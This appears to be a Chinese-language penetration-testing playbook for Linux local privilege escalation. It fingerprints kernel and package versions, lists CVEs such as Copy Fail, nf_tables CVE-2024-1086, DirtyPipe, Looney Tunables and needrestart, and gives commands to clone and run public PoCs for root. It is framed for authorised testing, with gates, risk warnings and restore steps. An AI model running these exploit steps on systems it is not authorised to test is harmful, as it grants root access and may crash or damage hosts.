# Linux Kernel / 本地 CVE LPE

> **TECH：** 版本门控的 kernel / glibc / needrestart LPE  
> **IMPACT：** uid=0；错版本可能 panic  
> **原则：** `uname -r` + 发行版公告 → `../../shared/cve-enrichment.md` → 公开稳定 PoC。LES 命中 ≠ 可打。

K8s 跨工作负载配方不写在这里。

---

## 0. 指纹

```bash
uname -a
uname -r
cat /etc/os-release
cat /proc/version
sysctl kernel.unprivileged_userns_clone 2>/dev/null
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
lsmod | grep -E 'nf_tables|overlay|xfs'
id
```

```bash
# Debian/Ubuntu
dpkg -l linux-image-$(uname -r) sudo libc6 needrestart 2>/dev/null
# RHEL
rpm -q kernel glibc needrestart
```

```bash
vulnx id CVE-2026-31431
vulnx id CVE-2024-1086
vulnx search 'linux kernel && is_kev:true && is_poc:true' --limit 20
```

厂商公告（backport！）：

```text
Ubuntu USN / Debian DSA / Red Hat RHSA / Amazon ALAS / SUSE
不要只比 upstream 主线版本号
```

linux-exploit-suggester 仅当 Loud 且操作者同意：

```bash
./linux-exploit-suggester.sh
```

输出每一条再过 enrichment + tested kernel。

---

## 短名单

| CVE | 组件 | 何时 |
|---|---|---|
| CVE-2026-31431 Copy Fail | kernel AF_ALG / page cache | 2017 后多数未修发行版；公开 Python PoC |
| CVE-2024-1086 | nf_tables | ~5.14–6.6，公开 C PoC，错版本会崩 |
| CVE-2023-0386 OverlayFS | overlay + userns | 2025 进 KEV |
| CVE-2023-2640 / 32629 | Ubuntu overlay | 只打 Ubuntu 公告范围 |
| CVE-2022-0847 DirtyPipe | kernel 5.8–5.16 | 写 SUID 文件 |
| CVE-2023-4911 Looney Tunables | glibc | SUID 二进制 + GLIBC_TUNABLES |
| CVE-2024-48990 needrestart | Ubuntu Server 包 | 任意用户 root，等 unattended-upgrades |

Dirty Frag（2026-05 page-cache 后继类）：有研究帖但本 skill **不写假 exploit 命令**。指纹命中且 enrichment 显示 STABLE PoC 再由操作者引入仓库。

---

## CVE-2026-31431 Copy Fail — 主机 LPE

公开描述：kernel crypto `algif_aead` + splice 逻辑洞，未特权进程写 page cache，可 root，也可逃容器。Theori 公开短 Python。

- 讨论/索引：https://copy.fail/ （若可访问）
- 主机 PoC 仓库：https://github.com/theori-io/copy-fail-CVE-2026-31431
- K8s 跨工作负载：https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC → `/k8s`

### GATES

```bash
uname -r
cat /etc/os-release
# 厂商安全公告是否已修该 CVE
grep -i seccomp /proc/self/status
# AF_ALG 是否被 seccomp 拦；容器内常见
```

未修 kernel + 能创建 AF_ALG socket。容器 seccomp 默认可能拦 → 先在 host 用户命名空间打，或换 privileged。

### 执行

```bash
git clone https://github.com/theori-io/copy-fail-CVE-2026-31431
cd copy-fail-CVE-2026-31431
python3 copy_fail_exp.py
id
```

文件名随仓库 README 变化，**以当前 README 为准**。成功 = uid=0。

K8s DaemonSet/共享层那条不要在这里 `kubectl apply`。

### RESTORE

按 PoC 清理；可能污染 page cache 中的文件页。授权测试优先可回滚主机。notes 写 kernel 版本与 PoC commit。

---

## CVE-2024-1086 nf_tables

```bash
uname -r
lsmod | grep nf_tables
```

PoC：https://github.com/Notselwyn/CVE-2024-1086  
范围约 **v5.14–v6.6**（发行版 backport 后数字会骗人，必须看 RHSA/USN）。

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
# 按 README 编译；KernelCTF/Debian/Ubuntu 有不同 config
```

GATES：nf_tables 可用、未修、PoC 声明的 config 接近。失败率低但 **错版本/错误 config 会 panic**。唯一 shell 时先稳定化（`/shell`）再打。

RESTORE：成功即 root；失败可能要硬重启。

---

## OverlayFS CVE-2023-0386

userns + overlay copy-up 保 SUID。CISA KEV（2025）。

```bash
cat /proc/sys/kernel/unprivileged_userns_clone
id
uname -r
```

unprivileged userns = 0 且无 cap → 通常不可打。公开 PoC 多个，选标明 distro 的。成功后 `/tmp` 出现 root SUID bash → `./bash -p`。

GameOver(lay) CVE-2023-2640 / CVE-2023-32629：**Ubuntu 专属**。`lsb_release -a` 不是 Ubuntu 就别用这篇 PoC。

---

## DirtyPipe CVE-2022-0847

kernel 5.8–5.16（未 backport 修）。向 SUID 文件空洞写 payload。

```bash
uname -r
```

公开 `dirtypipe` PoC 把 `/usr/bin/su` 或 passwd 改掉。**先拷贝原文件**：

```bash
cp /usr/bin/su /tmp/su.bak
# 跑匹配的 PoC
```

RESTORE：`cp /tmp/su.bak /usr/bin/su`（需要已经 root 或 PoC 提供还原）。破坏 SUID 二进制会让系统 `su` 坏掉，必须还原。

---

## Looney Tunables CVE-2023-4911

glibc `GLIBC_TUNABLES` 在 SUID 二进制处理中的溢出。是 **glibc 版本洞**，不是 kernel。

```bash
ldd --version
/lib/x86_64-linux-gnu/libc.so.6
```

Qualys 原 advisory + 后续公开 exploit。必须匹配 glibc 版本。乱设 TUNABLES 会把 SUID 进程打崩。

---

## needrestart CVE-2024-48990（及 48991/48992）

Ubuntu Server 默认 needrestart + unattended-upgrades。任意本地用户 → root（Python 解释器被骗）。

```bash
dpkg -l needrestart
needrestart -v 2>/dev/null
ls /etc/needrestart
```

Qualys：https://www.qualys.com/needrestart  
公开 PoC 随包版本变。GATES：包版本在受影响区间。利用可能要等 apt/unattended-upgrades 触发；授权测试可自己触发 needrestart（若权限够）或等待。

不要把“安装了 needrestart”写成已 root。

---

## 通用 GATES

```text
精确 kernel/libc/包版本 + 厂商公告未修
公开 PoC tested 范围包含当前系统
unprivileged userns / nf_tables / AF_ALG 等前置存在
操作者接受 panic 风险
不是唯一不可恢复的 shell
```

无 STABLE PoC：P2 候选，不编命令。

## SOURCES

- https://nvd.nist.gov/vuln/detail/CVE-2026-31431
- https://github.com/theori-io/copy-fail-CVE-2026-31431
- https://github.com/Notselwyn/CVE-2024-1086
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- https://www.qualys.com/needrestart
- https://nvd.nist.gov/vuln/detail/CVE-2023-4911
